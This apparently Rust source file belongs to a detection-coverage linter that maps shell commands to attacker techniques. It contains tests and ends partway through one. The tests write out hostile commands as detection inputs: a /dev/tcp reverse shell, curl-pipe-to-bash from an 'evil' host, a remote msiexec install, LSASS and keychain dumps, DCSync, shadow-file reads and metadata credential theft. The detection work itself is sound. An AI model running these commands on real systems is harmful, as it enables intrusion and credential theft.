//! Walks parsed input, resolves each action against the knowledge base, and
//! produces a [`Report`] of detection-coverage findings.

use std::collections::{HashMap, HashSet};
use std::sync::Arc;

use crate::model::{Finding, KnowledgeBase, Report, Severity, SideEffect};
use crate::parser::{self, Command, parse_line};
use crate::telemetry::{EventObservation, Ingest};

fn finding_from_entry(
    entry: &crate::model::KbEntry,
    line: usize,
    matched_command: Option<crate::parser::Command>,
    observed_event: Option<Arc<HashMap<String, String>>>,
    observed_side_effects: Vec<crate::model::SideEffect>,
) -> Finding {
    Finding {
        line,
        source: "opseclint".to_string(),
        rule_id: entry.id.clone(),
        description: entry.description.clone(),
        techniques: entry.techniques.clone(),
        telemetry: entry.telemetry.clone(),
        detections: entry.detections.clone(),
        edr: Vec::new(),
        observed_side_effects,
        noise: entry.noise,
        severity: Severity::from_noise(entry.noise),
        matched_command,
        observed_event,
    }
}

/// Match one unit's commands against the whole KB, appending its findings.
///
/// A "unit" is a single logical action: a source line (from a script/playbook)
/// or one ingested telemetry record. `raw` is the raw text line-scoped matchers
/// evaluate against; `line` is the source position a finding points back at.
fn match_unit(
    kb: &KnowledgeBase,
    line: usize,
    commands: &[Command],
    raw: &str,
    observed_event: Option<&Arc<HashMap<String, String>>>,
    side_effects: &[crate::model::SideEffect],
    findings: &mut Vec<Finding>,
) {
    // Dedupe entries per unit so a rule matched by multiple segments (or by both
    // a command and a raw match) is reported once.
    let mut seen: HashSet<&str> = HashSet::new();
    for entry in &kb.entries {
        // `evaluate` yields the specific command that matched (for command-scoped
        // matchers) or the unit's first command (for line-scoped matches), kept
        // so coverage analysis can evaluate rule logic against it.
        if let Some(matched_command) = entry.matcher.evaluate(commands, raw)
            && seen.insert(entry.id.as_str())
        {
            findings.push(finding_from_entry(
                entry,
                line,
                matched_command,
                observed_event.cloned(),
                side_effects.to_vec(),
            ));
        }
    }
}

/// Assemble matched findings into a report: order loudest-first (then by line),
/// and record the loudest score and how many units were analyzed.
fn finalize(mut findings: Vec<Finding>, kb: &KnowledgeBase, lines_analyzed: usize) -> Report {
    findings.sort_by(|a, b| {
        b.noise
            .cmp(&a.noise)
            .then(a.line.cmp(&b.line))
            .then(a.rule_id.cmp(&b.rule_id))
    });

    let max_noise = findings.iter().map(|f| f.noise).max().unwrap_or(0);

    Report {
        platform: kb.platform.clone(),
        note: kb.note.clone(),
        findings,
        max_noise,
        lines_analyzed,
    }
}

/// Analyze a full input (a script, playbook, or single line) against the KB.
pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
    let mut findings = Vec::new();
    let mut lines_analyzed = 0;

    for unit in parser::preprocess(input) {
        let trimmed = unit.text.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        lines_analyzed += 1;

        // Commands from the line, plus any nested command substitutions so the
        // program inside `$(...)` / backticks is resolved too.
        let mut commands = parse_line(&unit.text);
        for sub in parser::command_substitutions(&unit.text) {
            commands.extend(parse_line(&sub));
        }

        match_unit(kb, unit.line, &commands, trimmed, None, &[], &mut findings);
    }

    finalize(findings, kb, lines_analyzed)
}

/// Analyze ingested telemetry: map each observed process-creation record's
/// commands against the KB, exactly as [`analyze`] does for parsed source lines.
/// The predictive and observed modes therefore share one matching core — the
/// only difference is where the commands came from. The record's real event
/// fields ride along on each finding so downstream Sigma evaluation can consult
/// them (see [`crate::sigma_eval::evaluate_observed`]).
pub fn analyze_telemetry(ingest: &Ingest, kb: &KnowledgeBase) -> Report {
    let mut findings = Vec::new();
    for obs in &ingest.observations {
        match_unit(
            kb,
            obs.record,
            &obs.commands,
            obs.raw.trim(),
            Some(&obs.event),
            &obs.side_effects,
            &mut findings,
        );
    }
    // Non-execution events with no captured causing execution: match standalone
    // against the KB's `event` axis (registry Run keys, etc.).
    for ev in &ingest.event_observations {
        match_event(kb, ev, &mut findings);
    }
    finalize(
        findings,
        kb,
        ingest.observations.len() + ingest.event_observations.len(),
    )
}

/// Match one standalone non-execution event against the KB's `event` axis,
/// appending a finding per matching entry. The recorded fields ride along as the
/// finding's `observed_event`, and the event's human detail as a confirmed
/// side-effect so the report shows what was seen.
fn match_event(kb: &KnowledgeBase, ev: &EventObservation, findings: &mut Vec<Finding>) {
    let mut seen: HashSet<&str> = HashSet::new();
    for entry in &kb.entries {
        if entry.matcher.evaluate_event(&ev.class, &ev.event) && seen.insert(entry.id.as_str()) {
            let mut f =
                finding_from_entry(entry, ev.record, None, Some(ev.event.clone()), Vec::new());
            f.observed_side_effects.push(SideEffect {
                class: ev.class.clone(),
                detail: ev.detail.clone(),
            });
            findings.push(f);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::kb;

    fn kb() -> KnowledgeBase {
        kb::load(kb::Platform::LinuxAuditd).expect("embedded KB must parse")
    }

    fn win_kb() -> KnowledgeBase {
        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
    }

    fn mac_kb() -> KnowledgeBase {
        kb::load(kb::Platform::MacosEs).expect("macos KB must parse")
    }

    #[test]
    fn macos_kb_detects_keychain_and_gatekeeper() {
        let report = analyze("security dump-keychain -d login.keychain", &mac_kb());
        assert_eq!(report.platform, "macos-es");
        assert!(report.findings.iter().any(|f| f.rule_id == "keychain-dump"));

        let gk = analyze("sudo spctl --master-disable", &mac_kb());
        let f = gk
            .findings
            .iter()
            .find(|f| f.rule_id == "gatekeeper-disable")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1553.001");
    }

    #[test]
    fn macos_kb_detects_macos_specific_tradecraft() {
        // Dynamic-linker hijacking via DYLD_INSERT_LIBRARIES.
        let dyld = analyze(
            "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /Applications/X.app/Contents/MacOS/X",
            &mac_kb(),
        );
        let f = dyld
            .findings
            .iter()
            .find(|f| f.rule_id == "dyld-insert")
            .expect("DYLD_INSERT_LIBRARIES injection should be detected");
        assert_eq!(f.techniques[0].id, "T1574.006");
        assert!(f.noise >= 75);

        // Local password-hash extraction via dscl ShadowHashData.
        let hash = analyze("sudo dscl . read /Users/victim ShadowHashData", &mac_kb());
        assert!(hash.findings.iter().any(|f| f.rule_id == "shadowhash-dump"));

        // LoginHook persistence.
        let hook = analyze(
            "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh",
            &mac_kb(),
        );
        assert!(
            hook.findings
                .iter()
                .any(|f| f.rule_id == "loginhook-persist")
        );
    }

    #[test]
    fn macos_kb_has_reached_platform_parity() {
        // macOS coverage was deepened to match Linux/Windows breadth.
        let mac = mac_kb();
        // Matches the count documented in the README/CHANGELOG; still allows
        // future growth, but catches a regression below the claimed breadth.
        assert!(
            mac.entries.len() >= 66,
            "expected a grown macOS KB, got {}",
            mac.entries.len()
        );
    }

    #[test]
    fn windows_kb_detects_lolbin_and_normalizes_exe_path() {
        // .exe extension and a full Windows path must still resolve to certutil.
        let report = analyze(
            "C:\\Windows\\System32\\certutil.exe -urlcache -f http://x/a.exe a.exe",
            &win_kb(),
        );
        assert_eq!(report.platform, "windows-sysmon");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "certutil-download")
        );
    }

    #[test]
    fn windows_kb_detects_lsass_dump() {
        let report = analyze(
            "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 lsass.dmp full",
            &win_kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "lsass-comsvcs"));
    }

    #[test]
    fn windows_kb_detects_ad_tradecraft() {
        let report = analyze("Invoke-Kerberoast -OutputFormat Hashcat", &win_kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "kerberoast-invoke")
        );

        let dcsync = analyze("lsadump::dcsync /domain:corp.local /user:krbtgt", &win_kb());
        let f = dcsync
            .findings
            .iter()
            .find(|f| f.rule_id == "dcsync")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1003.006");
    }

    #[test]
    fn windows_kb_detects_lolbins_and_uac_bypass() {
        // Remote MSI install (LOLBin proxy execution).
        let msi = analyze("msiexec /q /i http://evil.example/x.msi", &win_kb());
        let f = msi
            .findings
            .iter()
            .find(|f| f.rule_id == "msiexec-remote")
            .expect("msiexec remote install should be detected");
        assert_eq!(f.techniques[0].id, "T1218.007");

        // UAC bypass and AMSI bypass.
        let uac = analyze("C:\\Windows\\System32\\fodhelper.exe", &win_kb());
        assert!(
            uac.findings
                .iter()
                .any(|f| f.rule_id == "uac-bypass-fodhelper")
        );
        let amsi = analyze(
            "[Ref].Assembly...SetValue($null,$true) amsiInitFailed",
            &win_kb(),
        );
        assert!(amsi.findings.iter().any(|f| f.rule_id == "amsi-bypass"));
    }

    #[test]
    fn linux_kb_detects_cloud_and_container_tradecraft() {
        // Cloud instance metadata credential theft.
        let imds = analyze("curl http://169.254.169.254/latest/meta-data/iam/", &kb());
        let f = imds
            .findings
            .iter()
            .find(|f| f.rule_id == "cloud-imds")
            .expect("cloud metadata access should be detected");
        assert_eq!(f.techniques[0].id, "T1552.005");

        // Kubernetes service-account token theft.
        let tok = analyze(
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            &kb(),
        );
        assert!(tok.findings.iter().any(|f| f.rule_id == "k8s-sa-token"));

        // Container escape via nsenter into host namespaces.
        let esc = analyze("nsenter --target 1 --mount --net -- bash", &kb());
        let f = esc
            .findings
            .iter()
            .find(|f| f.rule_id == "nsenter-escape")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1611");
    }

    #[test]
    fn detects_reverse_shell() {
        let report = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "reverse-shell-devtcp")
        );
        assert!(report.max_noise >= 75);
    }

    #[test]
    fn detects_shadow_read() {
        let report = analyze("sudo cat /etc/shadow", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let report = analyze("curl http://evil/x.sh | bash", &kb());
        let ids: Vec<_> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"curl"));
        assert!(ids.contains(&"pipe-to-shell"));
    }

    #[test]
    fn benign_line_is_quiet() {
        let report = analyze("echo hello world", &kb());
        assert!(report.findings.is_empty());
    }

    #[test]
    fn no_double_count_per_line() {
        // `id` appears twice on the line but should be reported once.
        let report = analyze("id && id", &kb());
        let count = report.findings.iter().filter(|f| f.rule_id == "id").count();
        assert_eq!(count, 1);
    }

    #[test]
    fn detects_private_key_theft() {
        let report = analyze("cp ~/.ssh/id_rsa /tmp/k", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "private-key-rsa")
        );
    }

    #[test]
    fn detects_docker_socket_escape() {
        let report = analyze(
            "curl --unix-socket /var/run/docker.sock http://x/containers/json",
            &kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "docker-sock"));
    }

    #[test]
    fn kb_all_entries_parse() {
        let kb = kb();
        assert!(
            kb.entries.len() >= 55,
            "expected a grown KB, got {}",
            kb.entries.len()
        );
    }

    #[test]
    fn resolves_command_in_substitution() {
        // The reverse shell is hidden inside a command substitution.
        let report = analyze("data=$(cat /etc/shadow)", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn analyzes_shell_heredoc_body_at_correct_line() {
        let script = "bash <<EOF\nid\ncurl http://evil/x | bash\nEOF\n";
        let report = analyze(script, &kb());
        // The pipe-to-shell inside the here-doc body (line 3) is detected.
        let f = report
            .findings
            .iter()
            .find(|f| f.rule_id == "pipe-to-shell")
            .expect("pipe-to-shell should be found in heredoc body");
        assert_eq!(f.line, 3);
    }

    #[test]
    fn ignores_data_heredoc_body() {
        // A password in a `cat` here-doc body is data, not a command.
        let script = "cat <<EOF > /tmp/conf\npassword=hunter2\nEOF\n";
        let report = analyze(script, &kb());
        assert!(report.findings.is_empty());
    }

    // ---- Known-benign corpus -------------------------------------------------
    // Ordinary, security-irrelevant commands that MUST yield zero findings. This
    // guards against knowledge-base false positives from loose substring matches.
    // It deliberately excludes actions opseclint intentionally models as loud
    // (curl/wget, tar archiving, `ps`/`find`/kubectl discovery, whoami, etc.).

    const BENIGN_LINUX: &[&str] = &[
        "ls -la /home/user",
        "cd /var/log",             // reads and navigation under /var/log must not
        "tail -f /var/log/syslog", // be read as anti-forensic log clearing
        "ls /var/log/nginx",
        "cat /var/log/app.log",
        "cd /var/log && rm -rf target/debug", // rm not targeting /var/log, even
        "cd /var/log && ls -la",              // when the line also mentions it
        "pwd",
        "echo build complete",
        "cat README.md",
        "mkdir -p build/output",
        "cp config.example config.local",
        "mv old.txt new.txt",
        "rm -rf target/debug",
        "grep -rn TODO src/",
        "sed -i s/foo/bar/g file.txt",
        "git status",
        "git commit -m fix",
        "git push origin main",
        "cargo build --release",
        "cargo test --all",
        "npm install",
        "make -j4",
        "head -n 20 file.log",
        "df -h",
        "docker build -t app .",
        "systemctl status nginx",
    ];

    const BENIGN_WINDOWS: &[&str] = &[
        "dir C:\\Users",
        "type readme.txt",
        "copy a.txt b.txt",
        "del old.log",
        "mkdir builds",
        "Get-ChildItem -Path .",
        "Get-Content log.txt",
        "Write-Output done",
        "git status",
        "cargo build",
        "Get-Process",
        "Set-Location C:\\src",
        "Copy-Item a b",
        "New-Item -ItemType Directory build",
        "Remove-Item -Recurse target",
    ];

    const BENIGN_MACOS: &[&str] = &[
        "ls -la /Users",
        "cd /Applications",
        "pwd",
        "cat ~/notes.txt",
        "open .",
        "mkdir -p ~/dev/project",
        "cp a.txt b.txt",
        "git status",
        "brew list",
        "defaults read com.apple.dock",
        "diskutil list",
        "softwareupdate --list",
    ];

    fn assert_all_quiet(corpus: &[&str], kb: &KnowledgeBase) {
        for cmd in corpus {
            let report = analyze(cmd, kb);
            assert!(
                report.findings.is_empty(),
                "benign command `{cmd}` produced a false positive: {:?}",
                report
                    .findings
                    .iter()
                    .map(|f| f.rule_id.as_str())
                    .collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn benign_corpus_linux_is_silent() {
        assert_all_quiet(BENIGN_LINUX, &kb());
    }

    #[test]
    fn benign_corpus_windows_is_silent() {
        assert_all_quiet(BENIGN_WINDOWS, &win_kb());
    }

    #[test]
    fn benign_corpus_macos_is_silent() {
        assert_all_quiet(BENIGN_MACOS, &mac_kb());
    }

    #[test]
    fn clear_syslog_still_detects_real_clearing() {
        // The false-positive fix must not blind us to actual log clearing.
        for cmd in [
            "rm -rf /var/log/nginx",
            "truncate -s 0 /var/log/syslog",
            "shred -u /var/log/auth.log",
            "cd /tmp && rm -rf /var/log/nginx", // arg-scoped: still fires in a
                                                // compound line where rm hits /var/log
        ] {
            let report = analyze(cmd, &kb());
            assert!(
                report
                    .findings
                    .iter()
                    .any(|f| f.rule_id.starts_with("clear-syslog")),
                "expected a log-clearing finding for `{cmd}`"
            );
        }
    }

    // ---- Structured-matcher guards ------------------------------------------

    /// Every entry's own representative must fire its own rule. This is the
    /// self-consistency property: a matcher whose example does not match itself is
    /// a broken rule. It also proves the representative derivation used by
    /// `--verify-detections` / `--scaffold` stays aligned with the engine.
    ///
    /// Each axis is checked on its own terms. A command axis is checked by
    /// analyzing its representative line; an `event` axis by running its
    /// representative event through the same standalone-matching path real
    /// telemetry takes. An entry carrying both must satisfy both — the two are
    /// different claims about the same action, and neither implies the other.
    fn assert_self_consistent(kb: &KnowledgeBase) {
        for entry in &kb.entries {
            let has_command_axis = entry.matcher.program.is_some()
                || entry.matcher.args.is_some()
                || entry.matcher.line.is_some();
            assert!(
                has_command_axis || entry.matcher.event.is_some(),
                "entry `{}` has no matchable axis at all",
                entry.id
            );

            if has_command_axis {
                // An entry whose matcher uses a `regex` leaf cannot derive a
                // literal representative, so it must supply an `example`.
                assert!(
                    !entry.matcher.has_regex() || entry.example.is_some(),
                    "entry `{}` uses a regex leaf but has no `example`",
                    entry.id
                );
                let repr = entry.representative_line().unwrap_or_else(|| {
                    panic!(
                        "entry `{}` has no matchable field to build a representative from",
                        entry.id
                    )
                });
                let report = analyze(&repr, kb);
                assert!(
                    report.findings.iter().any(|f| f.rule_id == entry.id),
                    "entry `{}` did not fire on its own representative `{repr}`",
                    entry.id,
                );
            }

            if entry.matcher.event.is_some() {
                let (class, fields) = entry.matcher.representative_event().unwrap_or_else(|| {
                    panic!(
                        "entry `{}` has an `event` axis with no derivable representative",
                        entry.id
                    )
                });
                // Go through `analyze_telemetry` rather than calling the matcher
                // directly, so this exercises the same path a real standalone
                // event takes — ingest shape included.
                let ingest = Ingest {
                    observations: Vec::new(),
                    skipped: 0,
                    event_observations: vec![EventObservation {
                        record: 1,
                        class: class.as_str().to_string(),
                        detail: format!("representative {} event", class.as_str()),
                        event: Arc::new(fields.clone()),
                    }],
                };
                let report = analyze_telemetry(&ingest, kb);
                assert!(
                    report.findings.iter().any(|f| f.rule_id == entry.id),
                    "entry `{}` did not fire on its own representative {} event {fields:?}",
                    entry.id,
                    class.as_str(),
                );
            }
        }
    }

    #[test]
    fn every_entry_matches_its_own_representative() {
        assert_self_consistent(&kb());
        assert_self_consistent(&win_kb());
        assert_self_consistent(&mac_kb());
    }

    #[test]
    fn the_event_self_consistency_guard_catches_a_contradictory_entry() {
        // A guard that cannot fail proves nothing. Two `eq` leaves on one field
        // cannot both hold, so no representative can satisfy the entry — exactly
        // the authoring mistake this check exists to catch.
        let json = r#"{
            "platform": "linux",
            "entries": [{
                "id": "contradictory",
                "match": { "event": { "class": "file", "all": [
                    { "field": "TargetFilename", "eq": "/etc/shadow" },
                    { "field": "TargetFilename", "eq": "/etc/passwd" } ] } },
                "description": "d",
                "techniques": [{"id": "T1005", "name": "Data from Local System"}],
                "noise": 10
            }]
        }"#;
        let broken: KnowledgeBase = serde_json::from_str(json).expect("parses");
        // The panic here is the expected outcome, so keep it out of test output.
        let previous = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {}));
        let caught = std::panic::catch_unwind(|| assert_self_consistent(&broken));
        std::panic::set_hook(previous);
        assert!(
            caught.is_err(),
            "the guard accepted an entry that cannot match its own representative"
        );
    }

    /// Findings must not depend on the order entries appear in the KB: matching
    /// is a per-entry predicate with no cross-entry precedence (unlike the EDR
    /// classifier). Reversing the entry list must yield the same finding ids.
    #[test]
    fn entry_order_does_not_affect_findings() {
        let script = "curl http://evil/x.sh | bash\nrm -rf /var/log/nginx\ncat /etc/shadow";
        let base = kb();
        let mut reversed = base.clone();
        reversed.entries.reverse();

        let ids = |report: &Report| -> std::collections::BTreeSet<String> {
            report.findings.iter().map(|f| f.rule_id.clone()).collect()
        };
        assert_eq!(
            ids(&analyze(script, &base)),
            ids(&analyze(script, &reversed))
        );
    }

    // ---- Increment B: Linux KB migrated to structured `match` ---------------

    /// The FP-tightening entries keep a representative_line byte-identical to
    /// their pre-migration legacy form, so the `--verify-detections` baseline
    /// cannot move under the migration. Pinning them here guards that invariant.
    #[test]
    fn tightened_entries_keep_their_legacy_representative() {
        let kb = kb();
        let repr = |id: &str| -> Option<String> {
            kb.entries
                .iter()
                .find(|e| e.id == id)
                .unwrap_or_else(|| panic!("no KB entry with id `{id}`"))
                .matcher
                .representative_line()
        };
        assert_eq!(repr("private-key-rsa").as_deref(), Some("id_rsa"));
        assert_eq!(repr("private-key-ed25519").as_deref(), Some("id_ed25519"));
        assert_eq!(repr("clear-syslog-rm").as_deref(), Some("rm /var/log"));
        assert_eq!(
            repr("clear-syslog-truncate").as_deref(),
            Some("truncate /var/log")
        );
        assert_eq!(
            repr("clear-syslog-shred").as_deref(),
            Some("shred /var/log")
        );
        assert_eq!(repr("pipe-to-shell").as_deref(), Some("| bash"));
        assert_eq!(repr("pipe-to-sh").as_deref(), Some("| sh"));
    }

    /// Assert that every entry whose Sigma claim was withdrawn stays withdrawn.
    ///
    /// A withdrawal is a finding, not an oversight: the pinned ruleset carries
    /// nothing that can fire on the action, so claiming a detection would be
    /// worse than claiming none. Re-adding one would otherwise be easy to miss
    /// — the entry simply re-enters the audit, and its `UNVERIFIED` verdict is
    /// only caught by the baseline ratchet, which a regenerated baseline can
    /// launder. This test is the direct guard.
    fn assert_withdrawn(kb: &KnowledgeBase, claims: &[(&str, &str)]) {
        for (id, why) in claims {
            let entry = kb
                .entries
                .iter()
                .find(|e| e.id == *id)
                .unwrap_or_else(|| panic!("no KB entry with id `{id}`"));
            assert!(
                entry.detections.is_empty(),
                "`{id}` claims {:?}, but {why}",
                entry.detections
            );
            // The modeling is correct and stays — only the claim was wrong.
            assert!(
                !entry.techniques.is_empty(),
                "`{id}` lost its techniques along with its claim"
            );
        }
    }

    #[test]
    fn withdrawn_linux_sigma_claims_stay_withdrawn() {
        assert_withdrawn(
            &kb(),
            &[
                (
                    "crontab-l",
                    "T1053.003's process rule requires `/tmp/` (installing a job, \
                     not enumerating with -l), its two file_event rules model a \
                     record this entry does not carry, and the remaining one is a \
                     `service: cron` keyword rule over a cron *daemon log line*",
                ),
                (
                    "ss",
                    "the single T1049 rule enumerates /who /w /last /lsof /netstat \
                     and not /ss — SigmaHQ covers the deprecated tool, not its \
                     replacement",
                ),
                (
                    "python-http-server",
                    "T1105's process rules are keyed on /curl, /wget and scp \
                     keywords, and T1567's are network_connection, dns and proxy \
                     rules — `python3 -m http.server` reaches none of them",
                ),
                (
                    "usermod-group",
                    "T1098 carries an /esxcli rule and a keyword rule over \
                     auth.log prose (`new user` plus `GID=0,`); no usermod \
                     invocation reaches either",
                ),
            ],
        );
    }

    #[test]
    fn withdrawn_macos_sigma_claims_stay_withdrawn() {
        assert_withdrawn(
            &mac_kb(),
            &[
                // A rule keyed on an absolute `Image:` path can never fire
                // predictively: the evaluator synthesizes `Image` from the
                // program basename, so the comparison is a definite false.
                (
                    "screencapture",
                    "T1113's only macOS rule is keyed `Image: /usr/sbin/screencapture`",
                ),
                (
                    "mdfind",
                    "T1083's mdfind branch is keyed `Image: /usr/bin/mdfind`, and the \
                     sibling `find` branch requires -perm",
                ),
                (
                    "spctl-status",
                    "T1518.001's only non-csrutil rule is keyed `Image: /usr/bin/grep`",
                ),
                (
                    "gatekeeper-disable",
                    "T1553.001 carries only the xattr rule; the `spctl disable` branch \
                     lives under T1685 and is keyed `Image: /usr/sbin/spctl` anyway, so \
                     re-tagging would buy nothing",
                ),
                // The rule exists, but describes a different program.
                (
                    "base64-decode",
                    "T1140's macOS rules need /openssl with /Volumes/, or /bash with \
                     tail and an image extension",
                ),
                (
                    "keychain-find",
                    "the keychain rule's reachable branch needs ' dump-keychain ' or \
                     ' login-keychain '; find-generic-password is not covered, which is \
                     why keychain-dump keeps its claim and this one does not",
                ),
                (
                    "periodic-persist",
                    "T1053.003's only macOS rule is the crontab-plus-/tmp/ one",
                ),
                (
                    "tar-archive",
                    "T1560.001's only macOS rule is Disk Image Mounting Via Hdiutil",
                ),
                (
                    "ditto-archive",
                    "T1560.001's only macOS rule is Disk Image Mounting Via Hdiutil",
                ),
                (
                    "python-http-server",
                    "T1105's macOS rules are /nscurl, /chflags and osacompile; T1567's \
                     are proxy and dns rules",
                ),
                (
                    "scp-exfil",
                    "T1048 has no macOS rule at all, and T1105's do not cover scp",
                ),
                // No rule for the technique in any class this entry models.
                (
                    "reverse-shell-devtcp",
                    "T1059.004 has zero macOS rules, and T1071's only one requires \
                     ParentImage endswith /installer",
                ),
                (
                    "clipboard-capture",
                    "T1115's only indexed rule is Clipboard Access Via OSAScript, and \
                     this entry models pbpaste — SigmaHQ's pbpaste rule lives under \
                     rules-threat-hunting/, which the gate does not index",
                ),
                (
                    "netcat",
                    "T1095 has zero macOS rules and T1071's requires ParentImage. \
                     MacOS Network Service Scanning would fire, but it is tagged T1046 \
                     — untrue of a bare `nc` — and its filter is the single letter 'l', \
                     so reaching it means engineering a command line around a rule \
                     quirk rather than describing the action",
                ),
            ],
        );
    }

    #[test]
    fn withdrawn_windows_sigma_claims_stay_withdrawn() {
        assert_withdrawn(
            &win_kb(),
            &[(
                "ifeo-debugger",
                "SigmaHQ tags no rule for the IFEO `Debugger` value under \
                 T1546.012 — the two rules that carry it cover `GlobalFlag` and \
                 `SilentProcessExit` — and no process_creation rule carries it at \
                 all, so no authored `example` can reach one. The rules that do \
                 fire on a `Debugger` write are accessibility-scoped under \
                 T1546.008, which `accessibility-sethc` already claims and \
                 verifies",
            )],
        );
        // The event axis is what makes this entry worth keeping without a claim.
        let kb = win_kb();
        let e = kb
            .entries
            .iter()
            .find(|e| e.id == "ifeo-debugger")
            .expect("no KB entry with id `ifeo-debugger`");
        assert!(e.matcher.event.is_some());
        assert!(e.techniques.iter().any(|t| t.id == "T1546.012"));
    }

    /// The structured leaves (`word`, `path_under`, `not`) tighten entries that
    /// the old substring matcher over-fired on — without blinding the real
    /// detection.
    #[test]
    fn linux_structured_tightenings_kill_fps() {
        let kb = kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);

        // `word` boundary: a private-key rule keyed on `id_rsa` no longer fires
        // on an unrelated filename that merely contains the token, nor on the
        // public key.
        assert!(!fires("vim id_rsa_backup_notes.txt", "private-key-rsa"));
        assert!(!fires("cp id_rsa.pub /tmp/authorized", "private-key-rsa"));
        assert!(fires("cp ~/.ssh/id_rsa /tmp/k", "private-key-rsa"));

        // `path_under`: log-clearing no longer fires on a sibling path that only
        // shares a prefix, but still fires on real `/var/log` deletion.
        assert!(!fires("rm -rf /var/logistics", "clear-syslog-rm"));
        assert!(fires("rm -rf /var/log/nginx", "clear-syslog-rm"));

        // `word`: pipe-to-shell no longer fires on `| shuf` / `| shellcheck`.
        assert!(!fires("sort access.log | shuf", "pipe-to-sh"));
        assert!(fires("curl http://x/s.sh | sh", "pipe-to-sh"));
    }

    // ---- Increment C: Windows KB migrated to structured `match` -------------

    /// Windows entries whose legacy `args_contains` was multi-word migrate to the
    /// `joined` leaf (a per-arg `contains` would miss a phrase split across
    /// tokens). Guard that they still fire on realistic commands.
    #[test]
    fn windows_multiword_args_match_via_joined() {
        let kb = win_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires(
            "wmic /node:dc01 process call create \"cmd /c calc\"",
            "wmic-process-create"
        ));
        assert!(fires(
            "vssadmin delete shadows /all /quiet",
            "vssadmin-delete"
        ));
    }

    // ---- Increment D: macOS KB migrated to structured `match` ---------------

    /// macOS multi-word `args` (e.g. `list /users`, `setglobalstate off`) migrate
    /// to the `joined` leaf and must still fire on realistic commands.
    #[test]
    fn macos_multiword_args_match_via_joined() {
        let kb = mac_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires("sudo dscl . list /Users", "dscl-list-users"));
        assert!(fires("dscl . list /Groups", "dscl-groups"));
        assert!(fires(
            "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off",
            "firewall-disable"
        ));
    }

    /// The private-key entries carry the same representative-preserving `word` +
    /// `not .pub` tightening as the Linux KB.
    #[test]
    fn macos_private_key_tightening() {
        let kb = mac_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(!fires("vim id_rsa_backup_notes.txt", "private-key-ssh"));
        assert!(!fires("cp id_rsa.pub /tmp/authorized", "private-key-ssh"));
        assert!(fires("cp ~/.ssh/id_rsa /tmp/k", "private-key-ssh"));
    }

    // ---- Increment E: precision fixes for three over-matchers ---------------

    /// `powershell-hidden` was keyed on the bare word `hidden`; it now uses a
    /// `regex` leaf that covers the whole `-WindowStyle` abbreviation family
    /// (`-w` … `-windowstyle`, plus the numeric `1`) scoped to a PowerShell line.
    #[test]
    fn powershell_hidden_is_scoped_to_window_style() {
        let kb = win_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        // The full abbreviation family fires.
        for cmd in [
            "powershell -w hidden -enc ZQBjAA==",
            "powershell.exe -WindowStyle Hidden -c calc",
            "pwsh -windowsty hidden",
            "powershell -win hidden",
            "powershell -windowstyle 1",
            "cmd /c powershell -w hidden -enc ZQBjAA==", // wrapped launch
        ] {
            assert!(fires(cmd, "powershell-hidden"), "should fire: {cmd}");
        }
        // Does not fire on unrelated uses of "hidden", nor on a non-PowerShell
        // line that merely contains the `-w hidden` marker.
        for cmd in [
            "Get-ChildItem -Hidden C:\\Users",
            "cmd.exe /c echo -w hidden",
            "powershell -NoProfile -Command Get-Help",
        ] {
            assert!(!fires(cmd, "powershell-hidden"), "should not fire: {cmd}");
        }
    }

    /// `net-user` was keyed on the substring `user` (also firing on
    /// `net localgroup users` / `net help user`); it now pins `user` to the
    /// subcommand position and matches the `net1` alias seen in telemetry.
    #[test]
    fn net_user_requires_user_subcommand() {
        let kb = win_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires("net user administrator /domain", "net-user"));
        assert!(fires("net1 user administrator /domain", "net-user"));
        assert!(!fires("net localgroup users", "net-user"));
        assert!(!fires("net help user", "net-user"));
    }

    /// Local group *enumeration* (`net localgroup`) is covered by its own entry —
    /// the group-discovery action the tightened `net-user` no longer claims. It is
    /// scoped to discovery: a modifying `/add` / `/delete` invocation is group
    /// manipulation, not enumeration, and must not fire it.
    #[test]
    fn net_localgroup_is_covered() {
        let kb = win_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires("net localgroup users", "net-localgroup"));
        assert!(fires("net1 localgroup", "net-localgroup"));
        assert!(!fires("net user administrator", "net-localgroup"));
        // Modification, not enumeration — excluded to avoid a mislabeled finding
